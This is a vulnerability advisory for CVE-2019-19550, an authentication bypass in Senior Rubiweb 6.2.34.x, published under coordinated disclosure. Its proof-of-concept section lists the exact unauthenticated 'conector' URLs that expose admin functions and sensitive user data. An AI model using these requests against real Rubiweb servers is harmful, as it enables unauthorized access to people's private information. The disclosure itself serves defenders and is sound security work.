# CVE-2019-19550

------------------------------------------

## [Description]

Remote Authentication Bypass in Senior Rubiweb 6.2.34.28 and 6.2.34.37 allows admin access to sensitive information of affected users using vulnerable versions. The attacker only needs to provide the correct URL.

------------------------------------------

## [Important Dates]

- Announcement (to Vendor): 2019-12-02
- Public disclosure date: 2020-01-30

------------------------------------------

## [Vulnerability Type]

Incorrect Access Control

------------------------------------------

## [Vendor of Product]

Senior

------------------------------------------

## [Affected Product Code Base]

- Rubiweb - 6.2.34.37
- Rubiweb - 6.2.34.28
- Other versions may be affected, especially in the same family (not tested yet)

------------------------------------------

## [Affected Component]

Rubiweb

------------------------------------------

## [Attack Type]

Remote

------------------------------------------

## [Impact Information Disclosure]

True

------------------------------------------

## [Attack Vectors]

Access to sensitive information is publicly available without special requirements (only the correct URI)

------------------------------------------

## [Has vendor confirmed or acknowledged the vulnerability?]

True

------------------------------------------

## [PoC - Proof of Concept]

1. Simply try to connect to authenticated portal to confirm the existence and version of affected product: 
   - hXXp://subdomain.customer.tld:8080/rubiweb/
2. Access the vulnerable page (admin without authentication):
   - hXXp://subdomain.customer.tld:8080/rubiweb/conector?ACAO=EXESENHA&SIS=FP&LOGINKIND=1
   - hXXp://subdomain.customer.tld:8080/rubiweb/conector?ACAO=ENTRANCEREL&SIS=FP&NOME=FPIN103.ANU

------------------------------------------

## [Discoverer]

Mauricio Santos (R&D UnderProtection) and Hesron Hori (R&D UnderProtection)

------------------------------------------

## [Thanks to]

Senior - Vendor's Information Security Team who collaborated to a coordinated disclosure

------------------------------------------

## [Reference]

- https://www.underprotection.com.br
- https://documentacao.senior.com.br/tecnologia/6.2.34/index.htm
- https://documentacao.senior.com.br/tecnologia/6.2.34/index.htm#central-de-configuracao/CfgWebApplicationsForm.htm%23CfgWebApplicationsForm_edtUserName
